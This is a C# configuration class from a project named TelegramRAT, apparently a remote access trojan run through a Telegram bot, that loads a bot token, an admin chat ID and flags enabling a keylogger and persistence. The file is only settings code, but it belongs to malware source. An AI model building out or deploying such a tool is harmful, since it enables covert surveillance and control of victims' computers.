namespace TelegramRAT.Config;

using System.Text.Json;

internal sealed class BotConfig
{
    public string BotToken { get; init; } = string.Empty;
    public string AdminChatId { get; init; } = string.Empty;
    public int PollInterval { get; init; } = 1000;
    public bool EnableKeylogger { get; init; }
    public bool EnablePersistence { get; init; } = true;

    public static BotConfig Load()
    {
        var configPath = Path.Combine(AppContext.BaseDirectory, "config.json");

        if (File.Exists(configPath))
        {
            var json = File.ReadAllText(configPath);
            var config = JsonSerializer.Deserialize<BotConfig>(json);
            if (config != null) return config;
        }

        return new BotConfig
        {
            BotToken = Environment.GetEnvironmentVariable("TGRAT_TOKEN") ?? "",
            AdminChatId = Environment.GetEnvironmentVariable("TGRAT_CHAT_ID") ?? ""
        };
    }
}
